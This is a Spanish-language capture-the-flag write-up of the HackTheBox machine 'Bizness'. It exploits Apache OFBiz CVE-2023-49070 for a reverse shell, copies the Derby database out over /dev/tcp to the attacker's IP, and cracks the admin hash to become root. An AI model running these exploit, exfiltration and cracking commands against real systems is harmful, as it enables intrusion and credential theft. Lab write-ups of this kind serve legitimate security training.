---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Bizness

`Bizness` es una máquina Linux sencilla que muestra un punto de apoyo de ejecución remota de código (RCE) y autenticación previa de Apache OFBiz, clasificado como `[CVE-2023-49070](https://nvd.nist.gov/vuln/detail/CVE-2023-49070)`. El exploit se aprovecha para obtener un shell en la máquina, donde la enumeración de la configuración de OFBiz revela una contraseña con hash en la base de datos Derby del servicio. A través de la investigación y una pequeña revisión del código, el hash se transforma en un formato más común que puede ser descifrado por herramientas estándar de la industria. La contraseña obtenida se utiliza para iniciar sesión en la máquina como usuario root.

<figure><img src="../../.gitbook/assets/Bizness.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Bizness**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.252 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 01:26 CET
Initiating SYN Stealth Scan at 01:26
Scanning 10.10.11.252 [65535 ports]
Discovered open port 80/tcp on 10.10.11.252
Discovered open port 22/tcp on 10.10.11.252
Discovered open port 443/tcp on 10.10.11.252
Discovered open port 42039/tcp on 10.10.11.252
Completed SYN Stealth Scan at 01:26, 19.71s elapsed (65535 total ports)
Nmap scan report for 10.10.11.252
Host is up, received user-set (0.10s latency).
Scanned at 2025-02-16 01:26:36 CET for 20s
Not shown: 65472 closed tcp ports (reset), 59 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
443/tcp   open  https   syn-ack ttl 63
42039/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.81 seconds
           Raw packets sent: 76283 (3.356MB) | Rcvd: 75327 (3.014MB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.252
	[*] Open ports: 22,80,443,42039

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Nginx` y el servicio de `SSH` habilitado.

```bash
❯ nmap -sCV -p22,80,443,42039 10.10.11.252 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 01:28 CET
Nmap scan report for bizness.htb (10.10.11.252)
Host is up (0.062s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp   open  ssl/http   nginx 1.18.0
| tls-alpn: 
|_  http/1.1
|_http-trane-info: Problem with XML parsing of /evox/about
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_http-server-header: nginx/1.18.0
|_ssl-date: TLS randomness does not represent time
42039/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   88.82 ms 10.10.16.1
2   31.18 ms bizness.htb (10.10.11.252)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.34 seconds
```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/imagen (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.

```bash
❯ cat /etc/hosts | grep bizness
10.10.11.252 bizness.htb
```

## Web Enumeration

Realizaremos una comprobación de las tecnologías que utiliza el sitio web.

```bash
❯ whatweb https://bizness.htb
https://bizness.htb [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][ZZ], Email[info@bizness.htb], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[JSESSIONID], IP[10.10.11.252], JQuery, Lightbox, Script, Title[BizNess Incorporated], nginx[1.18.0]
```

Accederemos a [https://bizness.htb](https://bizness.htb) y nos encontramos con la siguiente página web.

<figure><img src="../../.gitbook/assets/5006_vmware_wdw86rIp2U.jpg" alt=""><figcaption></figcaption></figure>

Al realizar un escaneo con **dirsearch** sobre el objetivo [https://bizness.htb](https://bizness.htb), encontramos algunos directorios interesantes:

* **/control/** y **/control/login**: Aparecieron como rutas válidas, lo que podría indicarnos un panel de administración o alguna forma de autenticación.
* **/solr/admin/** y **/solr/admin/file/**: Estas rutas también regresaron respuestas, lo que sugiere que Solr está presente en el servidor. A través de estas rutas, podríamos tener la posibilidad de explorar configuraciones o archivos sensibles, aunque al principio no parecían ofrecer algo directamente explotable.

```bash
❯ dirsearch -u 'https://bizness.htb' -t 50 -i 200 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/Bizness/Bizness/reports/https_bizness.htb/_25-02-16_01-31-01.txt

Target: https://bizness.htb/

[01:31:01] Starting: 
[01:31:22] 200 -   34KB - /control/
[01:31:22] 200 -   34KB - /control
[01:31:28] 200 -   11KB - /control/login
[01:31:59] 200 -   21B  - /solr/admin/
[01:31:59] 200 -   21B  - /solr/admin/file/?file=solrconfig.xml

Task Completed
```

Al acceder a [https://bizness.htb/control](https://bizness.htb/control) se nos mostraba una página con un mensaje de error. Entre la información reportada, se nos indica que la página web utiliza `Apache OFBiz`.

{% hint style="info" %}
Apache OFBiz es un sistema de planificación de recursos empresariales (ERP) de código abierto. Ofrece un conjunto de aplicaciones empresariales que integran y automatizan muchos de los procesos comerciales de una empresa
{% endhint %}

<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al acceder a https://bizness.htb/solr/admin/ se nos redirigió a la siguiente página web en la cual se nos muestra un panel de autenticación.&#x20;

En el footer de la página, se menciona la versión de `Apache OFBinz`, la cual se trata de la versióon **18.12**.

<figure><img src="../../.gitbook/assets/5007_vmware_wxR5L4Lf8g.png" alt=""><figcaption></figcaption></figure>

## Initial Access

### Apache OFBiz 18.12 - PreAuth Remote Code Execution \[RCE] (CVE-2023-49070)&#x20;

Al revisar por Internet posibles vulnerabilidades sobre esa versión, nos encontramos con el siguiente `CVE-2023-49070`.

{% embed url="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-49070" %}

{% hint style="danger" %}
RCE previo a la autenticación en Apache Ofbiz 18.12.09. Se debe a que XML-RPC ya no se mantiene y sigue estando presente. Este problema afecta a Apache OFBiz: anterior a 18.12.10. Se recomienda a los usuarios que actualicen a la versión 18.12.10
{% endhint %}



Nos descargaremos el siguiente repositorio el cual nos proporcionan un exploit para aprovecharnos de la vulnerabilidad.

{% embed url="https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz" %}

```bash
❯ git clone https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz; cd Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz
Clonando en 'Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz'...
remote: Enumerating objects: 21, done.
remote: Counting objects: 100% (21/21), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 21 (delta 4), reused 0 (delta 0), pack-reused 0 (from 0)
Recibiendo objetos: 100% (21/21), 6.74 KiB | 6.74 MiB/s, listo.
Resolviendo deltas: 100% (4/4), listo.
```

El exploit nos indica que debemos de descargarnos `ysoserial` a través del siguiente comando.

```bash
❯ wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
--2025-02-16 01:36:46--  https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
Resolviendo github.com (github.com)... 140.82.121.3
Conectando con github.com (github.com)[140.82.121.3]:443... conectado.
Petición HTTP enviada, esperando respuesta... 302 Found
Localización: https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar [siguiendo]
--2025-02-16 01:36:46--  https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
Reutilizando la conexión con github.com:443.
Petición HTTP enviada, esperando respuesta... 302 Found
Localización: https://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250216%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250216T003725Z&X-Amz-Expires=300&X-Amz-Signature=6c5f8f1a07a6dc5626d497394a55e4a90ac28cca518b9b09d665826ccca1471b&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&response-content-type=application%2Foctet-stream [siguiendo]
--2025-02-16 01:36:46--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250216%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250216T003725Z&X-Amz-Expires=300&X-Amz-Signature=6c5f8f1a07a6dc5626d497394a55e4a90ac28cca518b9b09d665826ccca1471b&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&response-content-type=application%2Foctet-stream
Resolviendo objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.111.133, ...
Conectando con objects.githubusercontent.com (objects.githubusercontent.com)[185.199.108.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 59525376 (57M) [application/octet-stream]
Grabando a: «ysoserial-all.jar»

ysoserial-all.jar                                         100%[==================================================================================================================================>]  56,77M  34,8MB/s    en 1,6s    

2025-02-16 01:36:48 (34,8 MB/s) - «ysoserial-all.jar» guardado [59525376/59525376]
```

Revisaremos la sintaxis del exploit, el cual permite ejecutar comandos remotos o proporcionarnos una Reverse Shell directamente.

```bash
❯ python3 ofbiz_exploit.py -h
Usage: 
python3 ofbiz_exploit.py target_URL rce command
python3 ofbiz_exploit.py target_URL shell IP:PORT
```

Al intentar ejecutar el exploit, se nos menciona que debemos utilizar `OpenJDK-11`.

```bash
❯ python3 ofbiz_exploit.py https://bizness.htb rce id
The target appears to be vulnerable.
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Error while generating or serializing payload
java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets (in unnamed module @0x5cad8086) cannot access class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl (in module java.xml) because module java.xml does not export com.sun.org.apache.xalan.internal.xsltc.trax to unnamed module @0x5cad8086
	at ysoserial.payloads.util.Gadgets.createTemplatesImpl(Gadgets.java:102)
	at ysoserial.payloads.CommonsBeanutils1.getObject(CommonsBeanutils1.java:20)
	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)

        Error. Try changing your current Java version to Java 11: 
sudo apt-get install openjdk-11-jdk
        
sudo update-alternatives --config java
```

Nos lo descargaremos el `.deb` a través de la página oficial de Oracle.

{% embed url="https://www.oracle.com/es/java/technologies/javase/jdk11-archive-downloads.html" %}

Configuramos nuestro equipo para que utilize la versión `JDK-11`.

```bash
❯ sudo update-alternatives --config java
Existen 4 opciones para la alternativa java (que provee /usr/bin/java).

  Selección   Ruta                                          Prioridad  Estado
------------------------------------------------------------
  0            /usr/lib/jvm/jdk-11.0.25-oracle-x64/bin/java   184754176 modo automático
  1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java    1111      modo manual
* 2            /usr/lib/jvm/java-21-openjdk-amd64/bin/java    2111      modo manual
  3            /usr/lib/jvm/java-23-openjdk-amd64/bin/java    2311      modo manual
  4            /usr/lib/jvm/jdk-11.0.25-oracle-x64/bin/java   184754176 modo manual

Pulse <Intro> para mantener el valor por omisión [*] o pulse un número de selección: 0
update-alternatives: utilizando /usr/lib/jvm/jdk-11.0.25-oracle-x64/bin/java para proveer /usr/bin/java (java) en modo automático
```

Realizaremos una prueba básica para verificar que podemos ejecutar comandos. Para ello, nos montaremos un servidor web.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ejecutaremos el exploit para que ejecute el comando `cURL` hacía nuestro servidor web.

```bash
❯ python3 ofbiz_exploit.py https://bizness.htb rce 'curl http://10.10.16.3/gzzcoo'
The target appears to be vulnerable.
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[?] It is not possible to be certain of success. The target may not be truly vulnerable. [?]
Check if the reverse shell was established or if there is any command output.
```

Verificamos en nuestro servidor web que se ha recibido la petición `GET` desde el equipo víctima. Con lo cual, queda confirmada la ejecución de comandos.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.252 - - [16/Feb/2025 01:38:57] code 404, message File not found
10.10.11.252 - - [16/Feb/2025 01:38:57] "GET /gzzcoo HTTP/1.1" 404 -
```

El siguiente paso será obtener una Reverse Shell, para ello nos pondremos en escucha con`nc`.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Ejecutaremos el exploit pora proporcionarnos directamente la Reverse Shell.

```bash
❯ python3 ofbiz_exploit.py https://bizness.htb shell 10.10.16.3:443
The target appears to be vulnerable.
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[?] It is not possible to be certain of success. The target may not be truly vulnerable. [?]
Check if the reverse shell was established or if there is any command output.
```

Verificamos que hemos ganado acceso al sistema como el usuario `ofbiz`y podemos ver el contenido de la flag **user.txt**.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.252] 51542
bash: cannot set terminal process group (570): Inappropriate ioctl for device
bash: no job control in this shell
ofbiz@bizness:/opt/ofbiz$ cat /home/ofbiz/user.txt
eb342ca9148c8*******************
```

Al obtener la reverse shell, mejoramos la calidad de la shell con los siguientes pasos para obtener una TTY interactiva.

```bash
ofbiz@bizness:/opt/ofbiz$ script /dev/null -c bash 
script /dev/null -c bash
Script started, output log file is '/dev/null'.
ofbiz@bizness:/opt/ofbiz$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo;fg
[2]  - continued  nc -nlvp 443
                              reset xterm

...[snip]...

ofbiz@bizness:/opt/ofbiz$ export TERM=xterm
ofbiz@bizness:/opt/ofbiz$ export SHELL=bash
ofbiz@bizness:/opt/ofbiz$ stty rows 46 columns 230
```

## Privilege Escalation

### Analysis of OFbiz code to understand the hashes storage mechanism

Después de enumerar el sistema con el usuario `ofbiz`, no logramos obtener ninguna información interesante.

Con lo cual, nos llevó a pensar que quizás exista una base de datos para el `Apache OFBiz`. Nos encontramos que `OFBiz` utiliza `Derby` como base de datos.

<figure><img src="../../.gitbook/assets/5009_vmware_Somv8oHEO1.png" alt=""><figcaption></figcaption></figure>

{% embed url="https://cwiki.apache.org/confluence/display/OFBIZ/Apache+OFBiz+Technical+Production+Setup+Guide" %}

Enumerando el directorio de `/opt/ofbiz/framework/security/config`, nos encontramos con un archivo nombrado `security.properties` el cual contenías las propiedades de seguridad de la configuración de `Apache OFBiz`.

Entre el resultado obtenido, verificamos que se está empleando encriptación de `SHA`.

```bash
ofbiz@bizness:/opt/ofbiz/framework/security/config$ cat security.properties 
##############################################################################
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
###############################################################################
####
# OFBiz Security Settings
###

...[snip]...

# -- should we encrypt (SHA Hash) the password? --
password.encrypt=true

# -- specify the type of hash to use for one-way encryption, will be passed to java.security.MessageDigest.getInstance() --
# -- options may include: SHA, PBKDF2WithHmacSHA1, PBKDF2WithHmacSHA256, PBKDF2WithHmacSHA384, PBKDF2WithHmacSHA512 and etc
password.encrypt.hash.type=SHA
```

Realizamos una búsqueda recursiva a través del comando `find` para localizar algún archivo/directorio relacionado con la base de datos de `Apache OFBiz` llamada `Derby`.

```bash
ofbiz@bizness:/opt/ofbiz$ find / -name derby 2>/dev/null
/home/ofbiz/.gradle/caches/modules-2/files-2.1/org.apache.derby/derby
/home/ofbiz/.gradle/caches/modules-2/metadata-2.69/descriptors/org.apache.derby/derby
/opt/ofbiz/runtime/data/derby
```

Accedemos a `/opt/ofbiz/runtime/data/derby` y logramos encontrar la estructura de la base de datos que hace uso `Apache OFBiz`.

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data$ ls -l derby
total 16
-rw-r--r-- 1 ofbiz ofbiz-operator 2320 Feb 15 19:27 derby.log
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Feb 15 19:27 ofbiz
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Feb 15 19:27 ofbizolap
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Feb 15 19:27 ofbiztenant
```

Para trabajar mejor con la información, lo que realizaremos es comprimir todo el directorio de `derby` para disponerlo de manera local en nuestro equipo.

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data$ tar -czf derby.tar.gz derby
ofbiz@bizness:/opt/ofbiz/runtime/data$ ls -l 
total 3332
drwxr-xr-x 5 ofbiz ofbiz-operator    4096 Dec 21  2023 derby
-rw-r--r-- 1 ofbiz ofbiz-operator    1231 Oct 13  2023 derby.properties
-rw-r--r-- 1 ofbiz ofbiz-operator 3398865 Feb 15 19:54 derby.tar.gz
-rw-r--r-- 1 ofbiz ofbiz-operator      88 Oct 13  2023 README
```

Nos pondremos en escucha con `nc` para recibir el comprimido.

```bash
❯ nc -nlvp 443 > derby.tar.gz
listening on [any] 443 ...
```

Enviaremos la información a través de `/dev/tcp`.

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data$ cat derby.tar.gz > /dev/tcp/10.10.16.3/443
```

Una vez recibido el archivo en nuestro equipo local, lo descomprimiremos para analizarlo posteriormente.

```bash
❯ gunzip derby.tar.gz
❯ tar -xvf derby.tar
```

### Connecting to a Derby database (ij)

Nos encontramos con los archivos que utiliza `Apache OFBiz` para la base de datos `Derby`.  A través del siguiente blog, se nos menciona como lograr conectarnos.

Mediante la herramienta `ij`, logramos conectarnos a la base de datos que disponemos localmente en el directorio mencionado. Visualizamos los `SCHEMAS` y el que parece interesarnos más es el de `OFBIZ`.

{% embed url="https://db.apache.org/derby/docs/10.14/tools/ttoolsij97656.html" %}

```bash
❯ ls
 log   seg0   tmp   db.lck   dbex.lck   README_DO_NOT_TOUCH_FILES.txt   service.properties
❯ pwd
/home/kali/Desktop/HackTheBox/Linux/Bizness/content/Ofbiz/ofbiz
❯ ij
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Versión de ij 10.14
ij> CONNECT 'jdbc:derby:/home/kali/Desktop/HackTheBox/Linux/Bizness/content/Ofbiz/ofbiz';
ij> show SCHEMAS;
TABLE_SCHEM                   
------------------------------
APP                           
NULLID                        
OFBIZ                         
SQLJ                          
SYS                           
SYSCAT                        
SYSCS_DIAG                    
SYSCS_UTIL                    
SYSFUN                        
SYSIBM                        
SYSPROC                       
SYSSTAT                       

12 filas seleccionadas
```

Enumeramos las tablas de la base de datos `OFBIZ`, en el resultado obtenido, comprobamos una tabla mencionada `USER_LOGIN`.

```bash
ij> SHOW TABLES IN OFBIZ;   

TABLE_SCHEM         |TABLE_NAME                    |REMARKS             
------------------------------------------------------------------------
OFBIZ               |ACCOMMODATION_CLASS           |                    
OFBIZ               |ACCOMMODATION_MAP             |                    
OFBIZ               |ACCOMMODATION_MAP_TYPE        |                    
OFBIZ               |ACCOMMODATION_SPOT            |                    
OFBIZ               |ACCTG_TRANS                   |  

...[snip]...

OFBIZ               |USER_AGENT                    |                    
OFBIZ               |USER_AGENT_METHOD_TYPE        |                    
OFBIZ               |USER_AGENT_TYPE               |                    
OFBIZ               |USER_LOGIN                    |                    
OFBIZ               |USER_LOGIN_HISTORY            |                    
OFBIZ               |USER_LOGIN_PASSWORD_HISTORY   |                    
OFBIZ               |USER_LOGIN_SECURITY_GROUP     |                    
OFBIZ               |USER_LOGIN_SECURITY_QUESTION  |                    
OFBIZ               |USER_LOGIN_SESSION            |                    
OFBIZ               |USER_PREFERENCE               |                    
OFBIZ               |USER_PREF_GROUP_TYPE          |  
```

Al revisar los datos de dicha tabla, nos encontramos con las credenciales del usuario`admin` en formato hash `SHA`, tal cómo se mencionaba en el archivo de configuración de seguridad.

```bash
ij> SELECT * FROM OFBIZ.USER_LOGIN;
USER_LOGIN_ID                    |CURRENT_PASSWORD                                                                |PASSWORD_HINT                                                                                                                   |IS_&|ENA&|HAS&|REQ&|LAST_CURRENCY_UOM   |LAST_LOCA&|LAST_TIME_ZONE                                              |DISABLED_DATE_TIME           |SUCCESSIVE_FAILED_LO&|EXTERNAL_AUTH_ID                                                                                                                |USER_LDAP_DN                                                                                                                    |DISABLED_BY                                                                                                                     |LAST_UPDATED_STAMP           |LAST_UPDATED_TX_STAMP        |CREATED_STAMP            
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
system                           |NULL                                                                            |NULL                                                                                                                            |Y   |N   |NULL|NULL|NULL                |NULL      |NULL                                                        |NULL                         |NULL                 |NULL                                                                                                                            |NULL                                                                                                                            |NULL                                                                                                                            |2023-12-16 03:39:04.584      |2023-12-16 03:39:04.538      |2023-12-16 03:38:54.694      |2023-12-16 03:38:54.284      |system              
anonymous                        |NULL                                                                            |NULL                                                                                                                            |NULL|N   |NULL|NULL|NULL                |NULL      |NULL                                                        |NULL                         |NULL                 |NULL                                                                                                                            |NULL                                                                                                                            |NULL                                                                                                                            |2023-12-16 03:38:54.747      |2023-12-16 03:38:54.284      |2023-12-16 03:38:54.747      |2023-12-16 03:38:54.284      |NULL                
admin                            |$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I                                              |NULL                                                                                                                            |NULL|Y   |N   |N   |NULL                |NULL      |NULL                                                        |NULL                         |NULL                 |NULL                                                                                                                            |NULL                                                                                                                            |NULL                                                                                                                            |2023-12-16 03:44:54.272      |2023-12-16 03:44:54.213      |2023-12-16 03:40:23.643      |2023-12-16 03:40:23.445      |NULL                

3 filas seleccionadas
ij> 
```

### Cracking Apache OFBiz SHA1 Passwords

Para lograr crackear este hash, nos encontramos con la siguiente herramienta.

{% embed url="https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker" %}

Intentamos crackear el has obtenido y finalmente logramos obtener las credenciales en texto plano del hash del usuario `admin`.

```bash
❯ python3 OFBiz-crack.py --hash-string '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I' --wordlist /usr/share/wordlists/rockyou.txt
[+] Attempting to crack....
Found Password: monkeybizness
hash: $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
(Attempts: 1478440)
[!] Super, I bet you could log into something with that!
```

Intentamos cambiar de usuario al usuario `root` con las credenciales obtenidas, y comprobamos del correcto acceso como `root`. Finalmente, visualizamos la flag **root.txt**.

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data$ su root
Password: 
root@bizness:/opt/ofbiz/runtime/data# cat /root/root.txt 
fe0e508dad**********************
```
